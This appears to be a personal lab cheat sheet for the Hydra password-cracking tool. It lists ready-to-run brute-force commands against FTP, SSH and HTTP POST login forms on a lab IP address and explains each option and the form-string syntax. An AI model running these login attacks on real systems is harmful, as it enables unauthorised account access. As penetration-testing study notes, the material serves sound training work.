-------------------HYDRA-------------------------
1. to find any file
find / -type f -name "rockyou.txt" 2>/dev/null


Hydra is a brute force online password cracking program, a quick system login password “hacking” tool.

DIFFERENT PROTOCOLS = DIFFERETN SYNTAX

1. FTP:
hydra -l user -P passlist.txt ftp://10.49.191.197
where user - username
passlist.txt - the path and list name
ftp - the protocol used 
://ip - the target ip

2. SSH
hydra -l <username> -P <full path to pass> 10.49.191.197 -t 4 ssh

In Hydra, “threads to spawn” simply means how many login attempts Hydra will try at the same time.


3. Post Web Form
sudo hydra <username> <wordlist> 10.49.191.197 http-post-form "<path>:<login_credentials>:<invalid_response>"

Option				Description
-l			the username for (web form) login
-P			the password list to use
http-post-form		the type of the form is POST
<path>			the login page URL, for example, login.php (http-post-form "/login:username^USER^&password=^PASS^:f=incorrect")
<login_credentials>	the username and password used to log in, for example, username=^USER^&password=^PASS^
<invalid_response>	part of the response when the login fails
-V			verbose output for every attempt


hydra -l <username> -P <wordlist> 10.49.191.197 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V

The login page is only /, i.e., the main IP address.
The username is the form field where the username is entered
The specified username(s) will replace ^USER^
The password is the form field where the password is entered
The provided passwords will be replacing ^PASS^
Finally, F=incorrect is a string that appears in the server reply when the login fails
